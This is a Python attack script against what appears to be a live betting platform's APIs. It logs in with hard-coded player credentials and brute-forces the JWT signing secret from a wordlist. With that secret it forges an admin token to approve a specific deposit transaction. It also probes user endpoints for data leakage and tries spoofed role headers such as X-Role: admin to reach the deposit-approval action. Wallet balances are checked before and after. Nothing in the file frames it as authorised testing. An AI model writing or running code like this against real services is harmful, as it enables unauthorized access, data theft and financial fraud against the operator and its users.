#!/usr/bin/env python3
"""probe_jwt_crack.py — Expanded JWT crack + mgapi recon with fresh params.

   Flows:
   1. Crack all cached JWTs against expanded targeted.txt (150+ words)
   2. If secret found: forge BO JWT and approve deposit
   3. Probe /mb/deposit-transaction with template header variants
   4. Probe /mb/users for deposit data leakage
   5. Try mgapi with bo-role header spoofing
"""
import base64, hashlib, hmac as hmac_mod, json, pathlib, requests, time, uuid

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
KNOWN_DEP = "99e7a448-7d3a-4aee-ae87-eff1e3763347"
ADMIN_UUID = "5958356c-eb4e-4e07-a155-83e4382e3532"
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth failed: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── 1. JWT crack ──────────────────────────────────────────────────────────────
print("\n=== 1. JWT crack (expanded wordlist) ===")
words = pathlib.Path("targeted.txt").read_text().splitlines()
words = [w.strip() for w in words if w.strip() and not w.startswith("#")]
print(f"  {len(words)} words loaded")

def crack_jwt(jwt_str, label):
    parts = jwt_str.split(".")
    if len(parts) != 3:
        return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    pad = parts[2] + "=" * (-len(parts[2]) % 4)
    try:
        sig = base64.urlsafe_b64decode(pad)
    except Exception:
        return None
    for word in words:
        if hmac_mod.new(word.encode(), msg, hashlib.sha256).digest() == sig:
            print(f"  [!!!] SECRET FOUND for {label}: '{word}'")
            return word
    print(f"  {label}: no match ({len(words)} words)")
    return None

jwt_targets = {"vak88z2_player": JWT}
for f in sorted(pathlib.Path(".").glob(".jwt.*")):
    name = f.name[5:]
    if name not in jwt_targets:
        c = f.read_text().strip()
        if c and "." in c:
            jwt_targets[f"file_{name}"] = c

found_secrets = {}
for label, jwt_str in jwt_targets.items():
    s = crack_jwt(jwt_str, label)
    if s:
        found_secrets[label] = s

# ── 2. Forge BO JWT if secret found ──────────────────────────────────────────
if found_secrets:
    print("\n=== 2. Forge BO JWT ===")
    for label, secret in found_secrets.items():
        header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
        now = int(time.time())
        bo_payload = {
            "sub": ADMIN_UUID,
            "iat": now,
            "exp": now + 14400,
            "role": "admin",
            "tid": TID,
            "domain": DOMAIN,
        }
        payload_b64 = base64.urlsafe_b64encode(json.dumps(bo_payload).encode()).rstrip(b"=").decode()
        msg = f"{header}.{payload_b64}".encode()
        sig = base64.urlsafe_b64encode(hmac_mod.new(secret.encode(), msg, hashlib.sha256).digest()).rstrip(b"=").decode()
        bo_jwt = f"{header}.{payload_b64}.{sig}"
        print(f"  Forged BO JWT: {bo_jwt[:60]}...")

        bo_hdr = {**HDR, "Authorization": f"Bearer {bo_jwt}"}
        # Try bgapi with forged JWT
        r = requests.get(f"{BGAPI}/bo/info/admin?domain={DOMAIN}", headers=bo_hdr, timeout=10)
        print(f"  bgapi /bo/info/admin: HTTP {r.status_code}: {r.text[:200]}")
        r = requests.get(f"{BGAPI}/bo/auto-deposit-assign-task?domain={DOMAIN}&skip=0&limit=5",
                         headers=bo_hdr, timeout=10)
        print(f"  bgapi deposit-task list: HTTP {r.status_code}: {r.text[:300]}")
        r = requests.post(f"{BGAPI}/bo/auto-deposit-assign-task/admin-do-task",
                          headers=bo_hdr,
                          json={"domain": DOMAIN, "action": "approve",
                                "deposit_transaction_id": KNOWN_DEP},
                          timeout=10)
        print(f"  POST admin-do-task: HTTP {r.status_code}: {r.text[:200]}")
else:
    print("\n=== 2. Forge BO JWT: skipped (no secret) ===")

# ── 3. /mb/deposit-transaction with template header variants ─────────────────
print("\n=== 3. /mb/deposit-transaction template variants ===")
for template in ["vn", "th", "en", "admin", "bo", "manager", "internal", ""]:
    h = {**HDR, "template": template}
    if not template:
        del h["template"]
    r = requests.get(f"{MGAPI}/mb/deposit-transaction",
                     headers=h, params={"domain": DOMAIN}, timeout=8)
    if r.status_code != 400:
        print(f"  [!!!] template={template!r}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  template={template!r}: 400 (still panics)")

# ── 4. mgapi /mb/users for deposit data ──────────────────────────────────────
print("\n=== 4. /mb/users endpoint ===")
r = requests.get(f"{MGAPI}/mb/users", headers=HDR, params={"domain": DOMAIN}, timeout=10)
print(f"  GET /mb/users: HTTP {r.status_code}: {r.text[:400]}")

r = requests.get(f"{MGAPI}/mb/users/me", headers=HDR, timeout=10)
print(f"  GET /mb/users/me: HTTP {r.status_code}: {r.text[:400]}")

# Try getting deposit info from user profile
r = requests.get(f"{MGAPI}/mb/users?domain={DOMAIN}&skip=0&limit=5", headers=HDR, timeout=10)
print(f"  GET /mb/users list: HTTP {r.status_code}: {r.text[:400]}")

# ── 5. mgapi with BO-role header spoofing ─────────────────────────────────────
print("\n=== 5. mgapi BO-role header spoof ===")
spoof_combos = [
    {"X-Role": "admin"},
    {"X-Role": "bo"},
    {"X-Admin": "true"},
    {"X-BO-Admin": ADMIN_UUID},
    {"X-Service-Auth": TID},
    {"X-Internal": "true", "X-Role": "admin"},
    {"template": "bo"},
    {"template": "admin"},
    {"X-TID": TID, "X-Role": "admin"},
]
for extra in spoof_combos:
    h = {**HDR, **extra}
    r = requests.get(f"{MGAPI}/mb/deposit-transaction",
                     headers=h, params={"domain": DOMAIN, "skip": 0, "limit": 5}, timeout=8)
    if r.status_code != 400:
        label = str(extra)[:50]
        print(f"  [!!!] {label}: HTTP {r.status_code}: {r.text[:300]}")
    # Also try the POST approval path
    r2 = requests.post(f"{MGAPI}/mb/auto-deposit-assign-task/admin-do-task",
                       headers=h,
                       json={"domain": DOMAIN, "action": "approve",
                             "deposit_transaction_id": KNOWN_DEP},
                       timeout=8)
    if r2.status_code not in (404, 400, 401):
        label = str(extra)[:50]
        print(f"  [!!!] POST task {label}: HTTP {r2.status_code}: {r2.text[:200]}")

time.sleep(2)
print(f"\nFINAL wallet: {wallet()}")
print("=== DONE ===")
